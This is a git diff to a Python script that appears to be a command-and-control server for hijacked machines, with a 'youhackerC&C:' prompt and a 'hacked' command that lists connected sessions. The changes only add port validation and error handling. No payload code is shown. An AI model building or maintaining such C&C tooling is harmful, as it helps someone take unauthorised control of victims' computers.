@@ -1,24 +1,31 @@
 import random
 import socket
-import  requests
+import requests
 import json
 import os
 import threading
 import platform
 from os.path import *
 import playsound
+import sys
 if platform.system() == "Windows":
     clear = "cls"
 else:
     clear = "clear"
 
 f = open('serverport.txt', 'r').read()
-if f == "{}" or "":
-    serverport = input('entre serverport:')
+if f == "{}" or f == "":
+    serverport = ""
+    while True:
+        serverport = input('entre serverport:')
+        if not serverport.isnumeric():
+            print("Invalid port.")
+        else:
+            break
     with open('serverport.txt', 'w') as port:
         port.write(serverport)
 keys = open('key.txt', 'r').read()
-if keys == "{}" or "":
+if keys == "{}" or f == "":
     key = input('entre serverkey:')
     with open('key.txt', 'w') as keyser:
         keyser.write(key)
@@ -550,7 +557,24 @@ ips = []
 stop_flag = False
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 p = open('serverport.txt', 'r').read()
-sock.bind(('', int(p)))
+try:
+    sock.bind(('', int(p)))
+except OSError:
+    while True:
+        reset = input("Cannot access port. reset serverport? (Y/n): ").lower()
+        if (reset not in ["y", "n"]):
+            print("Jewb Asba.")
+        else:
+            break
+    if reset == "y":
+        f = open("serverport.txt", "w")
+        f.close
+    sys.exit(1)
+except ValueError:
+    print("Invalid server port.")
+    f = open("serverport.txt", "w")
+    f.close()
+    
 sock.listen(5)
 t1 = threading.Thread(target=accept_connections)
 t1.start()
@@ -561,7 +585,6 @@ while True:
     command = input('youhackerC&C: ')
     if command == 'hacked':
         counter = 0
-
         for ip in ips:
             print('Session ' + str(counter) + ' --- ' + str(ip))
             counter += 1
